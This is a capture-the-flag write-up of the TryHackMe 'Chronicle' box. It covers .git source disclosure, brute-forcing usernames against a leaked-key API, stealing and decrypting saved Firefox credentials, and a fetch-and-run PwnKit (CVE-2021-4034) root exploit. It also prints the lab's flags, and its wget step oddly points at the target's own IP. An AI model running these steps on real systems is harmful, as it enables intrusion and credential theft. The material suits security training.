# TryHackMe - Chronicle

## Recon

Kicked things off with a full TCP scan against the box.

```
└─$ nmap -Pn -sS -sV -sC -A -T4 10.48.160.232 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-20 16:22 +0530
Nmap scan report for 10.48.160.232
Host is up (0.031s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
```

Three ports of interest: SSH on 22, Apache on 80, and a Werkzeug (Flask) dev server on 8081. The Flask server immediately stands out as the more "custom" part of the box.

Ran a directory brute-force against port 80:

```
└─$ gobuster dir -u http://10.48.160.232:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
===============================================================
old                  (Status: 301) [Size: 312] [--> http://10.48.160.232/old/]
```

`/old/` turned up — worth digging into.

## Exposed .git Directory

Poking around `/old/` revealed an exposed `.git` directory, which means the full version history of whatever used to live there was downloadable. Pulled it down with git-dumper and started going through the history locally.

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/chronicle/.git]
└─$ ls    
note.txt  templates
                                                                                                                                                                                                                                                                                                                              
┌──(lightningf4st㉿kali)-[~/Tryhackme/chronicle/.git]
└─$ git log                                                                                                
commit 038a67e0ebfde470bf83f31174b6e60726c646ae (HEAD -> master)
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:50:26 2021 +0000

    Clearing again

commit cd0375717551c8c8287a53b78b014b7d7e4da3bb
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:49:59 2021 +0000

    Clearing

commit 33891017aa63726711585c0a2cd5e39a80cd60e6
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:34:33 2021 +0000

    Finishing Things

commit 25fa9929ff34c45e493e172bcb64726dfe3a2780
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:32:19 2021 +0000

    First Commit
```

The latest commits are just "clearing" the repo, which is always a sign that something interesting got deleted. Diffing one of the "clearing" commits brought back the original `app.py`:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/chronicle/.git]
└─$ git show cd0375717551c8c8287a53b78b014b7d7e4da3bb
...
-@app.route('/api/<uname>',methods=['POST'])
-def info(uname):
-    if(uname == ""):
-        return "Username not provided"
-    print("OK")
-    data=request.get_json(force=True)
-    print(data)
-    if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
-        if(uname=="admin"):
-            return '{"username":"admin","password":"password"}'     #Default Change them as required
-        elif(uname=="someone"):
-            return '{"username":"someone","password":"someword"}'   #Some other user
-        else:
-            return 'Invalid Username'
-    else:
-        return "Invalid API Key"
...
+Everything has been moved to new directory and the webapp has been deployed
```

So the old Flask app had an `/api/<username>` endpoint that returns credentials for a given username, gated behind a hardcoded API key: `7454c262d0d5a3a0c0b678d6c0dbc7ef`. The source only hardcodes `admin` and `someone`, but the note at the end confirms the same app was redeployed elsewhere — which lines up with the Werkzeug server sitting on port 8081.

## Exploiting the API

Port 8081 hosts a login page along with a "forgot password" flow that posts to `/api/<username>` — exactly the endpoint recovered from the git history. Confirmed the endpoint was alive by sending the leaked key against it:

```
POST /api/admin HTTP/1.1
Host: 10.48.160.232:8081
Content-Type: application/json

{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8

Invalid Username
```

The response confirmed the key was valid but the username wasn't, so the real usernames had to be brute-forced rather than guessed. Threw the username into the URL path as the Intruder position and ran a sniper attack with the leaked key in the body:

```
POST /api/§admin§ HTTP/1.1
Host: 10.48.160.232:8081
Content-Type: application/json

{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}
```

One payload in the list — `tommy` — returned actual credentials instead of "Invalid Username":

```
POST /api/tommy HTTP/1.1
Host: 10.48.160.232:8081
Content-Type: application/json

{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8

{"username":"tommy","password":"DevMakesStuff01"}
```

Valid creds: `tommy:DevMakesStuff01`.

## Initial Foothold

SSH'd in with the recovered credentials and grabbed the user flag:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/chronicle]
└─$ ssh tommy@10.48.160.232          
tommy@10.48.160.232's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)
Last login: Fri Apr 16 14:05:02 2021 from 192.168.29.217
tommy@incognito:~$ ls -al
total 44
-rw-r--r-- 1 tommy tommyV   33 Apr  3  2021 user.txt
drwxr-xr-x 5 tommy tommyV 4096 Apr  3  2021 web
tommy@incognito:~$ cat user.txt 
7ba840222ecbdb57af4d24eb222808ad
tommy@incognito:~$ sudo -l
[sudo] password for tommy: 
Sorry, user tommy may not run sudo on incognito.
```

No sudo rights for tommy, so moved on to enumerating other users on the box.

## Pivoting to carlJ via Firefox Credentials

```
tommy@incognito:/home$ ls -al
drwxr-xr-x  8 carlJ carlJ  4096 Jun 11  2021 carlJ
drwxr-xr-x  7 tommy tommyV 4096 Jun 11  2021 tommyV
```

`carlJ`'s home directory was world-readable, and it had a `.mozilla/firefox` profile sitting inside it — meaning saved browser credentials were potentially recoverable. Pulled the whole profile back to the attacking machine with `scp`:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/chronicle/.git]
└─$ scp -r tommy@10.48.160.232:/home/carlJ/.mozilla/firefox firefox
tommy@10.48.160.232's password: 
profiles.ini     100%  259     3.6KB/s   00:00    
key4.db          100%  288KB   1.9MB/s   00:00    
logins.json      100%  592     8.5KB/s   00:00
...
```

With the profile copied over, ran `firefox_decrypt` against it to pull the saved logins. It prompted for a primary/master password on the profile — a bit of trial and error on common passwords eventually landed on the right one:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/chronicle/.git]
└─$ python3 firefox_decrypt.py firefox
Select the Mozilla profile you wish to decrypt
1 -> 45ir4czt.default
2 -> 0ryxwn4c.default-release
2

Primary Password for profile firefox/0ryxwn4c.default-release: 

Website:   https://incognito.com
Username: 'dev'
Password: 'Pas$w0RD59247'
```

That decrypted set of credentials wasn't for a web login on this box — it was reused as `carlJ`'s own system password. Switched user on the existing SSH session:

```
tommy@incognito:~$ su carlJ 
Password: 
carlJ@incognito:~$ 
```

## Privilege Escalation to Root

With a shell as `carlJ`, ran LinPEAS to check for privilege escalation paths. It flagged the box as vulnerable to **CVE-2021-4034 (PwnKit)** — the polkit `pkexec` local privilege escalation affecting the installed Ubuntu 18.04 kernel/userland.

Grabbed a prebuilt PwnKit PoC and served it from the attacking box:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/chronicle]
└─$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
                                                                                                                                                                                                                                                                                                                              
┌──(lightningf4st㉿kali)-[~/Tryhackme/chronicle]
└─$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.48.160.232 - - [20/Oct/2026 16:56:15] "GET /PwnKit HTTP/1.1" 200 -
```

Pulled it down on the target, made it executable, and ran it:

```
carlJ@incognito:~/mailing$ wget http://10.48.160.232:8081/PwnKit
Saving to: ‘PwnKit’
PwnKit                                                                          100%[===>]  17.62K  --.-KB/s    in 0.03s   

carlJ@incognito:~/mailing$ chmod +x ./PwnKit
carlJ@incognito:~/mailing$ ./PwnKit
root@incognito:/home/carlJ/mailing# cd /root
root@incognito:~# ls -al
-rw-r--r--  1 root root   33 Apr  3  2021 root.txt
root@incognito:~# cat root.txt 
f21979de76c0302154cc001884143ab2
root@incognito:~# 
```

Root.

## Summary

| Step | Technique |
|---|---|
| Recon | nmap + gobuster found `/old/` on port 80 |
| Source disclosure | Exposed `.git` directory dumped and mined via `git log` / `git show` |
| Initial access | Hardcoded API key + username brute-force against a leaked `/api/<username>` endpoint recovered `tommy`'s password |
| user.txt | `7ba840222ecbdb57af4d24eb222808ad` |
| Lateral movement | Decrypted `carlJ`'s saved Firefox logins and reused the password for `su carlJ` |
| Privesc | CVE-2021-4034 (PwnKit) |
| root.txt | `f21979de76c0302154cc001884143ab2` |
